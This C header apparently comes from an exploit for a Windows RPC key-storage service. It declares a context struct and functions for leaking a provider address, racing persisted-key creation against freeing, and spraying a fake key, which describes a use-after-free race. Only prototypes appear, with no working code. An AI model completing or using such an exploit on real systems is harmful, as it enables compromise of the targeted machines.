#pragma once

typedef struct
{
    RPC_BINDING_HANDLE  hBinding;
    PVOID               contextHandle;
    PVOID               providerHandle;
    ULONG64             keyHandle;
    ULONG_PTR           fakeProviderAddress;
} CTX, *PCTX;

ULONG_PTR LeakProviderAddress(RPC_BINDING_HANDLE hBinding, PVOID ContextHandle, PVOID ProviderHandle);
void CreateRaceThreads(RPC_BINDING_HANDLE hBinding);

void RaceCreatePersistedKey(PCTX ctx);
void RaceFreePersistedKey(PCTX ctx);
void RaceSprayFakeKey(PCTX ctx);